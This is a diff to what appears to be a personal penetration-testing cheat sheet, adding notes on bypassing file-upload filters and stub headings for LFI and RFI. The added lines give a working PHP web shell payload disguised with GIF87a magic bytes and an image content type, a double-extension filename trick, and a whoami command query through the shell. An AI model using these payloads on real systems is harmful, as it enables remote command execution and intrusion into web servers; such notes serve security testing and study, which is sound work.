@@ -684,13 +684,33 @@ executed and get back a reverse shell
 	- go to file in url and make a whoami query
 		- www.website.com/path/to/web.php5/?cmd=whoami
 
+- GIF87a
+	- Computers reads a file as GIF when placed in file name
+		Content-Dispostion: 
+		    form-data; 
+		    name="file"; 
+		    filename='web.php'
+		    Content-Type: image/GIF
+
+		GIF87a
+		<?php system($_GET['cmd']); ?>
 
 
-
+- Bypass File Upload Filters
+	- PNG image filter bypass
+		- /var/www/images/web.png.php
 
 
 
 ####### LFI & RFL ########
+
+- LFI = Local File Inclusion
+- RFI = Remote File Inclusion
+
+
+
+
+
 ####### Cookies & Tokens ########
 ####### Wordpress & CMS ########
 
